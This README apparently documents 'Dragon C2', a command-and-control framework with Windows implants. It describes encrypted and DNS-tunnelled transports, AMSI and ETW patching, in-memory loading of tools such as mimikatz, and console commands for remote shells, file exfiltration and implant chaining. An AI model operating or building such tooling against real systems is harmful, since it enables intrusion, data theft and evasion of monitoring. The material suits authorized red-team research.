# Dragon C2

A command and control framework written in C for offensive security research.

Server runs on Linux. Client runs on Windows. All traffic is encrypted with X25519 ECDH + ChaCha20-Poly1305.

> **Disclaimer:** This tool is for authorized security testing and educational purposes only. The author is not responsible for any misuse. Always get written permission before testing on systems you do not own.

## Features

Multi-level client chaining.
Transport support: TCP, HTTP, HTTPS, SMB named pipes (multi-level only), DNS tunneling.
HTTPS with TLS certificate pinning and ephemeral certificates.
X25519 ECDH key exchange + ChaCha20-Poly1305 encryption with rekeying support.
Double encryption layer for sub-clients (end-to-end, parent cannot read payload).
Malleable C2 profile system with per-client settings.
In-memory execution: native PE reflective loader, .NET assembly via CLR hosting, COFF/BOF (Beacon Object File) loader.
File upload (server to client) and download (client to server) with chunking.
Random packet padding for traffic obfuscation.
Client cross-compilation from the server console.
Beacon-based client health monitoring with configurable jitter.
MongoDB for session handling.

## Architecture

```
		                    +------------------+
		                    |   Dragon Server  |
		                    |   (Linux / C)    |
		                    +--------+---------+
		                             |
		                  HTTPS / TCP / HTTP / DNS
		                             |
		                    +--------+---------+
		                    |  Level 1 Client  |
		                    |  (Windows / C)   |
		                    +--------+---------+
		                             |
		                  HTTPS / TCP / SMB / DNS
		                             |
		                    +--------+---------+
		                    |  Level 2 Client  |
		                    |  (Windows / C)   |
		                    +--------+---------+
		                             |
		                           (...)
```

Each client can act as a relay for deeper clients. The server communicates end-to-end with every client regardless of depth. Parent nodes only see encrypted blobs and forward them without being able to read the content.

SMB transport is available only for multi-level connections (between clients). It cannot be used for client-to-server communication because the server runs on Linux and cannot create Windows named pipes. DNS transport works for client-to-server.

## Crypto

Key exchange: X25519 ECDH with ephemeral client keys and a static server key.
Encryption: ChaCha20-Poly1305 IETF (AEAD) for every frame.
KDF: BLAKE2B (via libsodium crypto_generichash) to derive encryption key, base IV, and chain key.
Nonce: base_iv XOR monotonic counter (unique per frame).
Rekeying: dragon_rekey() derives a new encryption key and chain key from the current chain key every REKEY_INTERVAL frames (default 1000).
Sub-clients: double encryption layer. Inner layer is end-to-end between server and sub-client. Outer layer is between parent and child for transport security. Parent cannot decrypt the inner payload.
TLS pinning: HTTPS clients verify the server certificate SHA-256 hash at first connection.

### Crypto functions (crypto_dragon.c)

dragon_handshake_client / dragon_handshake_server: X25519 ECDH key exchange over the transport. The client generates an ephemeral keypair, sends its public key, and both sides compute the shared secret.
dragon_handshake_with_father: same ECDH exchange but between a child client and a parent client.
dragon_handshake_http_child: handshake variant for HTTP transport where the child connects to a parent listener running HTTP.
dragon_derive_keys: takes the ECDH shared secret and derives separate client-to-server and server-to-client encryption keys, base IVs, and chain keys using BLAKE2B.
dragon_encrypt_frame / dragon_decrypt_frame: encrypt and decrypt a fixed-size frame using ChaCha20-Poly1305. The nonce is built from base_iv XOR counter. The 8-byte counter header is prepended to the ciphertext.
dragon_rekey: derives a new key and chain key from the current chain key using BLAKE2B. Called automatically every REKEY_INTERVAL frames.

### Known crypto limitations (documented, not yet fixed)

No server authentication (theoretical MitM on first connection).
Server public key is static and hardcoded in the client.

## Malleable profile system

The malleable profile controls how clients behave and what their traffic looks like. It is defined in `malleable_profile.h` as a packed struct that fits inside a single PACKET_DRAGON payload.

Profile fields:

beacon_interval_s: seconds between beacons (default 20).
jitter_pct: randomness percentage (0 to 50) applied to beacon timing.
reconnect_delay_ms: milliseconds before a reconnect attempt.
http_user_agent: User-Agent header for HTTP/HTTPS traffic.
http_content_type: Content-Type header.
http_path_data: URL path for data transfers (default /c2).
http_path_hs: URL path for handshake (default /c2/hs).
http_extra_headers: additional HTTP headers separated by \r\n.
smb_pipe_name: named pipe name for SMB transport (default dragon_pipe).
dns_domain: domain for DNS tunneling (e.g. c2.example.com).
dns_poll_ms: DNS polling interval in milliseconds (default 3000).
pkt_pad_min / pkt_pad_max: random padding range in bytes for traffic obfuscation.

The server loads profile settings from `profile.conf` at startup and before every generate. The profile is serialized (opcode 0x50) and sent to the client right after the handshake. For multi-level, the parent relays the profile to its children.

Profile commands on the server console:

```
Dragon: profile_reload              Reload profile.conf from disk
Dragon: profile                     Show current profile in memory
Dragon: profile_init                Create a default profile.conf
```

## Packet padding

Every transport supports random packet padding via `padding.h`. The generate_padding() function uses libsodium's randombytes to add between pkt_pad_min and pkt_pad_max random bytes to each packet. This makes traffic analysis harder because packet sizes are no longer fixed.

## Project structure

```
dragon_c2/
  server/
    dragon_server.c        Main server with operator console
    crypto_dragon.c/.h     Server-side crypto functions
    transport.c/.h         Transport registry (tcp, http, https, dns)
    transport_tcp.c        TCP backend (Linux)
    transport_http.c       HTTP backend (Linux, OpenSSL) with frame queue
    transport_https.c      HTTPS backend (Linux, OpenSSL) with frame queue
    transport_dns.c        DNS backend (Linux, UDP listener)
    keygen.c               Key and certificate pin generator
    CMakeLists.txt         Server build
  client/
    client.c               Main client with multi-level relay
    crypto_dragon.c/.h     Client-side crypto functions
    transport.c/.h         Transport registry (tcp, http, https, smb, dns)
    transport_tcp.c        TCP backend (Windows, Winsock)
    transport_http.c       HTTP backend (Windows, WinHTTP) with piggyback
    transport_https.c      HTTPS backend (Windows, WinHTTP + OpenSSL) with piggyback and SrvFrameQueue
    transport_smb.c        SMB backend (Windows, named pipes) with runtime pipe name
    transport_dns.c        DNS backend (Windows, Winsock UDP) with base32 encoding
    reflective_loader.c/.h Reflective PE loader (PIC shellcode)
    reflective_loader_shellcode.h  Extracted shellcode byte array (auto-generated)
    coff_loader.c/.h       COFF/BOF (Beacon Object File) loader with Beacon API
    dotnet_exec.c/.h       .NET assembly execution via CLR hosting (AMSI + ETW bypass)
    client_config.h.in     CMake config template with all profile defines
    server_pub.h           Server public key + certificate pin
    CMakeLists.txt         Client cross-compile build
  malleable_profile.h      Profile struct, serialization, deserialization
  padding.h                Random packet padding generator
  cmake/
    mingw-w64-toolchain.cmake   Cross-compilation toolchain
  deps/
    mingw64/               MinGW libraries (libsodium, OpenSSL)
  output/                  Generated client binaries
  profile.conf             Malleable profile settings (auto-created)
  setup_deps.sh            Downloads and builds MinGW dependencies
  .gitignore
  README.md
  CONTRIBUTING.md
  LICENSE
```

## Requirements

### Server (Linux)

GCC.
CMake 3.20+.
libsodium.
MongoDB C driver (libmongoc + libbson).
GNU readline.
OpenSSL 3.x.
MongoDB server running on localhost:27017.

### Client cross-compilation

x86_64-w64-mingw32-gcc (MinGW-w64 cross-compiler).
libsodium compiled for mingw64.
OpenSSL compiled for mingw64.
xxd (for shellcode header generation).

## Setup

### 1. Install system packages

```bash
# Ubuntu / Debian
sudo apt update && sudo apt install -y \
    build-essential cmake ninja-build \
    libsodium-dev libmongoc-dev libreadline-dev libssl-dev \
    gcc-mingw-w64-x86-64 binutils-mingw-w64-x86-64 \
    xxd
```

### 2. Install MongoDB

```bash
# Follow the official MongoDB docs for your distro:
# https://www.mongodb.com/docs/manual/tutorial/install-mongodb-on-ubuntu/

# After install, start it:
sudo systemctl start mongod
sudo systemctl enable mongod
```

### 3. Build the server

```bash
cd dragon_c2
cmake -S server -B server/build
cmake --build server/build
```

This produces two binaries in `server/build/`:
server: the Dragon C2 server.
keygen: key and certificate generator.

### 4. Generate TLS certificate

Required for HTTPS transport. The server uses this certificate for TLS connections with clients.

```bash
openssl req -x509 -newkey rsa:4096 \
    -keyout server.key -out server.crt \
    -days 365 -nodes -subj "/CN=dragon"
```

### 5. Generate keys

This creates the X25519 keypair and computes the TLS certificate pin. Run it from the project root:

```bash
./server/build/keygen
```

Output files:
server_priv.bin: server private key.
server_pub.h: server public key + certificate pin (embedded in client at compile time).

### 6. Install MinGW dependencies

Required for cross-compiling Windows clients from Linux:

```bash
./setup_deps.sh
```

This downloads libsodium for MinGW and compiles OpenSSL for MinGW. Takes about 5 minutes. The libraries are placed in `deps/mingw64/`.

### 7. Start the server

```bash
cd dragon_c2
./server/build/server
```

The server must be started from the project root directory so that it can find `server_priv.bin`, `server_pub.h`, `client/`, `cmake/`, and `profile.conf`.

## Usage

### Start a listener

```
Dragon: start <listener_name> https 8080
```

Supported protocols: `tcp`, `http`, `https`, `dns`

The server reloads profile.conf before starting a listener, so you can change HTTP paths, DNS domain, or other settings and they will be applied immediately.

### Generate a client

Level 1 client (connects directly to server):
```
Dragon: generate https 1 192.168.1.100 8080 <listener_name>
```

Level 2+ client (connects through a parent client):
```
Dragon: generate https 2 192.168.1.50 4447 <father_id> <listener_name>
```

DNS client:
```
Dragon: generate dns 1 192.168.1.100 53 <listener_name>
```

The generate command reads the profile from profile.conf. For level 1, it uses the profile of the matching server listener. For level 2+, it looks for the matching RemoteListener on the parent client and uses that profile. If the parent is not found it uses the global profile.

The generated .exe is in `output/`. It is statically linked and has no external dependencies beyond standard Windows DLLs.

### List clients

```
Dragon: clients
```

Shows all connected clients with ID, level, transport, IP, last beacon time, and status.

### Run a command

```
Dragon: send 8080 1 <client_id> whoami
```

### Interactive shell

```
Dragon: shell 8080 1 <client_id>
```

Type commands normally. Type `exit` or press Ctrl+C to close the shell.

### Upload file (server to client)

```
Dragon: uploads 8080 1 <client_id> /tmp/payload.exe C:\Users\test\payload.exe
```

Paths with spaces use single quotes:
```
Dragon: uploads 8080 1 <client_id> '/tmp/my file.exe' 'C:\Users\test\my file.exe'
```

### Download file (client to server)

```
Dragon: downloads 8080 1 <client_id> C:\Users\test\secret.txt /tmp/secret.txt
```

### Execute PE in memory

The execmem command detects the file type automatically and runs the right loader:

Native PE: reflective loader in a sacrificial notepad.exe process.
.NET assembly: CLR hosting with AMSI and ETW bypass.
COFF/BOF: Beacon Object File loader with Beacon API compatibility.

```
Dragon: execmem 8080 1 <client_id> /tmp/mimikatz.exe
```

With arguments:
```
Dragon: execmem 8080 1 <client_id> /tmp/tool.exe arg1 arg2
```

### Start a listener on a client (for chaining)

Tell a level 1 client to listen on port 4447 for a level 2 client:

```
Dragon: stlistener 8080 1 <client_id> <listener_name> 4447 https
```

For SMB (port is not needed because SMB uses the pipe name from the profile):
```
Dragon: stlistener 8080 1 <client_id> <listener_name> smb
```

### Stop a client listener

```
Dragon: stop_listener 8080 1 <client_id> <listener_name>
```

For SMB:
```
Dragon: stop_listener 8080 1 <client_id> <listener_name>
```

### List client listeners

```
Dragon: listlisteners 8080 1 <client_id>
```

### List client routes

```
Dragon: listroutes 8080 1 <client_id>
```

### Stop a server listener

```
Dragon: stop <listener_name>
```

### List server listeners

```
Dragon: list
```

### List global listeners

```
Dragon: listeners
```

### Profile commands

```
Dragon: profile_reload              Reload profile.conf from disk
Dragon: profile                     Show current profile in memory
Dragon: profile_init                Create a default profile.conf
```

### All commands

```
Dragon: help
```

## Transport details

### TCP

Standard TCP socket. Used for both client-to-server (level 1) and multi-level. Each frame is sent as a fixed-size encrypted blob over the stream.

### HTTP

Client uses WinHTTP. The client POSTs encrypted frames to the server and reads piggybacked server-to-client frames from the HTTP response body. On the client side (when acting as a listener for children), a SrvFrameQueue manages thread-safe frame exchange between the HTTP worker threads and the relay loop.

The server side uses raw sockets with a custom HTTP parser (server/http/). An http_queue provides a thread-safe task queue for dispatching frames to the right client.

Paths are configurable via the malleable profile (http_path_data, http_path_hs).

### HTTPS

Same as HTTP but with TLS. Client side uses OpenSSL for certificate pinning. The client verifies the server's certificate SHA-256 hash on first connection and rejects mismatches. The server side uses OpenSSL for TLS termination.

The HTTPS client transport has two modes. Normal mode is used for client-to-server connections. MODE_SERVER is used when the client acts as a listener for children. In MODE_SERVER, the client runs a TLS server using OpenSSL and uses SrvFrameQueue (thread-safe ring buffers with semaphore signaling) to exchange frames between the HTTP worker thread and the relay loop.

### SMB

Windows named pipes. Available only for multi-level connections (parent client to child client).

The pipe name comes from the malleable profile (smb_pipe_name, default "dragon_pipe"). At runtime the child applies the pipe name via smb_apply_pipe_name(). The parent creates the pipe with smb_listen() and the child connects with smb_connect(). Both use overlapped I/O with configurable timeouts.

Port 445 is used as an internal identifier in the server for SMB connections but the client ignores it. When you use stlistener or stop_listener with SMB you do not pass a port number.

### DNS

Tunnels C2 traffic inside standard DNS queries and responses. The client (Windows) encodes data in subdomain labels using base32 and receives data from TXT records (base64) or A records.

Protocol:
POLL: `<nonce>.<session>.p.<domain>` as an A query. Response 0.0.0.0 means no data, 0.0.0.1 means data waiting.
UPLOAD: `<b32data>.<idx>.<tot>.<session>.u.<domain>` as an A query. Response 0.0.0.<next_idx> as ACK.
DOWNLOAD: `<seq>.<session>.d.<domain>` as a TXT query. Response is base64 encoded payload or "NODATA".

The DNS domain is configurable in the malleable profile (dns_domain). The polling interval (dns_poll_ms, default 3000) controls how often the client checks for data.

## In-memory execution

### Reflective PE loader

For native (non-.NET) Windows executables:

1. Server sends the PE binary in chunks to the client.
2. Client spawns a suspended notepad.exe as a sacrificial process.
3. Client writes the raw PE into the sacrificial process memory.
4. Client writes a position-independent reflective loader (shellcode) into the process.
5. The loader maps PE sections, applies relocations, resolves imports, and calls the entry point.
6. stdout is captured via a pipe and sent back to the server as command output.
7. The sacrificial process is terminated when done.

The reflective loader is compiled as PIC (position-independent code) with stack protector disabled, extracted as raw shellcode via objcopy, and embedded in the client as a byte array.

The loader also detects .NET assemblies (via IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) and routes them to the CLR runner.

### .NET assembly execution (dotnet_exec.c)

For .NET executables:

1. Client loads the CLR runtime via COM (ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost).
2. Patches AMSI (AmsiScanBuffer) to bypass antimalware scanning.
3. Patches ETW (EtwEventWrite) to suppress event tracing.
4. Loads the .NET assembly into the default AppDomain.
5. Locates and invokes the entry point using IDispatch (GetIDsOfNames + Invoke).
6. Command-line arguments are split and passed as a SAFEARRAY of BSTR.
7. stdout is redirected via a pipe and sent back to the server as command output.

AMSI and ETW bypass can be toggled at compile time with BYPASS_AMSI and BYPASS_ETW defines.

### COFF/BOF loader (coff_loader.c)

For Beacon Object Files:

1. Client detects the file is a COFF by checking the machine type header.
2. Parses COFF sections, symbols, and relocations.
3. Allocates RWX memory and loads sections at the right offsets.
4. Applies relocations (AMD64: ADDR64, ADDR32NB, REL32 and variants; i386: DIR32, REL32).
5. Resolves external symbols from the Beacon API or from loaded DLLs (function names in the format `library$function`).
6. Provides a Beacon-compatible API: BeaconDataParse, BeaconDataInt, BeaconDataShort, BeaconDataLength, BeaconDataExtract, BeaconPrintf, BeaconOutput, BeaconFormatAlloc, BeaconFormatFree, BeaconFormatAppend, BeaconFormatPrintf, BeaconFormatToString, BeaconFormatInt, BeaconFormatReset.
7. Calls the `go` entry point with the argument buffer.
8. Output is sent back to the server as command output via two_layer_send.

The detection is automatic: when execmem receives a file, it checks if it is a COFF (is_coff_bof), a .NET assembly (pe_is_dotnet), or a native PE, and runs the right loader.

## Protocol

### Packet format

Every packet is a fixed 2048-byte `PACKET_DRAGON` struct, encrypted into a 2072-byte wire frame (8 byte counter header + 2048 plaintext + 16 byte Poly1305 tag).

```
| opcode (6B) | payload_size (2B) | target_level (1B) | target_id (41B) | payload (1998B) |
```

### Opcodes

```
0x00  Init / ID exchange         0x0B  Start listener (on client)
0x01  Beacon                     0x0C  Stop listener (on client)
0x02  Command exec / output      0x0D  Register new sub-client (routing)
0x03  Shell start                0x0E  Request listener list
0x04  Disconnect                 0x0F  Request route list
0x05  Shell data                 0x10  Handshake pubkey relay
0x06  Shell end                  0x11  Handshake ACK
0x07  DLL inject [LEGACY]        0x12  Client ID assignment
0x14  File download request      0x13  Handshake confirm
0x15  File download chunk        0x17  File upload start
0x16  File download end          0x18  File upload chunk
0x1A  File upload ACK            0x19  File upload end
0x1B  Exec memory start          0x1C  Exec memory PE chunk
0x1D  Exec memory args           0x50  Malleable profile
0x1E  Listener start ack
```

Download = client sends file to server. Upload = server sends file to client.

## Multi-level chaining example

This example sets up a 3-level chain: Server -> Client A -> Client B -> Client C

```
# 1. Start HTTPS listener on the server
Dragon: start <listener_name> https 8080

# 2. Generate and deploy Client A (level 1)
Dragon: generate https 1 10.0.0.1 8080 <listener_name>

# 3. After Client A connects, tell it to listen on port 4447
Dragon: stlistener 8080 1 <clientA_id> <listener_name> 4447 https

# 4. Generate Client B (level 2, connects to Client A)
Dragon: generate https 2 10.0.0.50 4447 <clientA_id> <listener_name>

# 5. After Client B connects, tell it to listen with SMB
Dragon: stlistener 8080 2 <clientB_id> <listener_name> smb

# 6. Generate Client C (level 3, connects to Client B via SMB)
Dragon: generate smb 3 10.0.0.75 0 <clientB_id> <listener_name>

# 7. Send a command to Client C (goes through A and B)
Dragon: send 8080 3 <clientC_id> ipconfig
```

All commands to Client C are encrypted end-to-end. Client A and Client B relay the packets but cannot read the payload. This example shows mixed transports: HTTPS from server to A, HTTPS from A to B, SMB from B to C.

## Beacon and health monitoring

The server checks client health every 30 seconds. If a client has not sent any data for a configurable timeout (default: beacon_interval * 4), it is marked as dead.

On TCP and SMB: the client sends a periodic beacon (opcode 0x01) every BEACON_INTERVAL seconds.
On HTTP and HTTPS: the client sends a periodic beacon via POST to ensure the server updates the heartbeat timestamp.
On DNS: the client sends periodic POLL queries.

The beacon interval is configurable per client via the malleable profile. Jitter adds randomness to the interval to avoid predictable patterns.

## Building the client manually

If you prefer to build the client without the server's `generate` command:

```bash
# Copy server_pub.h to client directory
cp server_pub.h client/

# Configure
cmake -S client -B output/build \
    -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-w64-toolchain.cmake \
    -DCLIENT_LEVEL=1 \
    -DSERVER_IP=192.168.1.100 \
    -DSERVER_PORT=8080 \
    -DUPSTREAM_TRANSPORT=https \
    -DBEACON_INTERVAL=20 \
    -DJITTER_PCT=20 \
    -DRECONNECT_DELAY_MS=5000 \
    -DHTTP_USER_AGENT="Mozilla/5.0" \
    -DHTTP_CONTENT_TYPE="application/octet-stream" \
    -DHTTP_PATH_DATA="/c2" \
    -DHTTP_PATH_HS="/c2/hs" \
    -DSMB_PIPE_NAME="dragon_pipe" \
    -DPKT_PAD_MIN=64 \
    -DPKT_PAD_MAX=512

# Build
cmake --build output/build
```

The output is `output/build/client.exe`. It is statically linked and has no external dependencies beyond standard Windows DLLs.

## TODO

Team Server GUI.
Evasion kit.

## Author

Giovanni - Cybersecurity Professional

## Status

This project is in active development. The core features work and have been tested with multi-level chains of clients and mixed transports types. Check the TODO list and CONTRIBUTING.md if you want to help.
Bug reports, feature ideas, and pull requests are all welcome. Every contribution helps the project grow.
Thanks to everyone who takes the time to look at this project, test it, or contribute in any way.

## License

This project is licensed under the GNU General Public License v3.0. See [LICENSE](LICENSE) for details.
